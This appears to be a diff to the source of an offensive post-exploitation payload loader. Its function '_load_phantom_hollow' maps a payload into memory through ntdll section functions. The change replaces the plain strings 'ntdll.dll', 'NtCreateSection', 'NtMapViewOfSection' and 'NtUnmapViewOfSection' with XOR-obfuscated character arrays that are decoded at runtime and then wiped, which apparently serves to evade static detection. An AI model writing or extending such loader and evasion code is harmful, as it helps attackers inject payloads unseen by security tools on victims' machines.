@@ -8,6 +8,7 @@
 #include "postex_loader.h"
 #include "pe_stomp.h"
 #include "memory_cleanup.h"
+#include "api_resolve.h"
 
 #ifdef CONFIG_INDIRECT_SYSCALLS
 #include "syscalls_wrappers.h"
@@ -229,18 +230,32 @@ static BOOL _load_phantom_hollow(const unsigned char *payload, SIZE_T payloadLen
     }
 
     /* Resolve Nt functions */
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    char _sn[] = {'n'^0x5A,'t'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,'.'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,0};
+    for(int _i=0;_sn[_i];_i++) _sn[_i]^=0x5A;
+    HMODULE hNtdll = GetModuleHandleA(_sn);
+    SecureZeroMemory(_sn, sizeof(_sn));
     if (!hNtdll) {
         _set_err(result, "Failed to get ntdll handle");
         return FALSE;
     }
 
+    char _sf1[] = {'N'^0x5A,'t'^0x5A,'C'^0x5A,'r'^0x5A,'e'^0x5A,'a'^0x5A,'t'^0x5A,'e'^0x5A,'S'^0x5A,'e'^0x5A,'c'^0x5A,'t'^0x5A,'i'^0x5A,'o'^0x5A,'n'^0x5A,0};
+    for(int _i=0;_sf1[_i];_i++) _sf1[_i]^=0x5A;
     pfnNtCreateSection NtCreateSection =
-        (pfnNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
+        (pfnNtCreateSection)GetProcAddress(hNtdll, _sf1);
+    SecureZeroMemory(_sf1, sizeof(_sf1));
+
+    char _sf2[] = {'N'^0x5A,'t'^0x5A,'M'^0x5A,'a'^0x5A,'p'^0x5A,'V'^0x5A,'i'^0x5A,'e'^0x5A,'w'^0x5A,'O'^0x5A,'f'^0x5A,'S'^0x5A,'e'^0x5A,'c'^0x5A,'t'^0x5A,'i'^0x5A,'o'^0x5A,'n'^0x5A,0};
+    for(int _i=0;_sf2[_i];_i++) _sf2[_i]^=0x5A;
     pfnNtMapViewOfSection NtMapViewOfSection =
-        (pfnNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
+        (pfnNtMapViewOfSection)GetProcAddress(hNtdll, _sf2);
+    SecureZeroMemory(_sf2, sizeof(_sf2));
+
+    char _sf3[] = {'N'^0x5A,'t'^0x5A,'U'^0x5A,'n'^0x5A,'m'^0x5A,'a'^0x5A,'p'^0x5A,'V'^0x5A,'i'^0x5A,'e'^0x5A,'w'^0x5A,'O'^0x5A,'f'^0x5A,'S'^0x5A,'e'^0x5A,'c'^0x5A,'t'^0x5A,'i'^0x5A,'o'^0x5A,'n'^0x5A,0};
+    for(int _i=0;_sf3[_i];_i++) _sf3[_i]^=0x5A;
     pfnNtUnmapViewOfSection NtUnmapViewOfSection =
-        (pfnNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
+        (pfnNtUnmapViewOfSection)GetProcAddress(hNtdll, _sf3);
+    SecureZeroMemory(_sf3, sizeof(_sf3));
 
     if (!NtCreateSection || !NtMapViewOfSection || !NtUnmapViewOfSection) {
         _set_err(result, "Failed to resolve Nt section functions");
